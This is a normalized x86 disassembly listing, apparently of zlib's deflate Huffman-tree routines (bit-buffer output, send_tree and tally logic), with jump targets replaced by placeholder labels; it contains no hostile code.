sub ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa76 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_40a69c
push ebp
mov ebp esp
sub esp 0x5c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x6 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x10 ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
mov [ ebp - 0x20 ] edx
mov eax 0x10
sub eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa74 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x24 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xabe ]
mov [ ebp - 0x50 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x50 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xaba ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab6 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xabc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x50 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xabc ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x54 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x54 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x50 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xab8 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xab4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x34 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x34 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x2c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0xb
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0xb
mov [ ebp - 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x5c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x5c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x58 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x58 ] 0x7
mov edx 0x10
sub edx [ ebp - 0x58 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x4c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x4c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x48 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x48 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x38 ] 0x2
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_40b174
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov dx [ ebp + 0xc ]
mov [ eax + ecx * 2 ] dx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1690 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1698 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a8 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
cmp [ ebp + 0xc ] 0x100
jae r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x8c ]
add dx 0x1
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x8c ] dx
jmp r-xdata
mov ecx [ ebp + 0xc ]
shr ecx 0x7
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1694 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x1698 ] eax
sete dl
mov eax edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x980 ]
add dx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x980 ] dx
sub_40b2a2
push ebp
mov ebp esp
sub esp 0x48
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1698 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ eax + ecx ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + 0x400 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x400 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
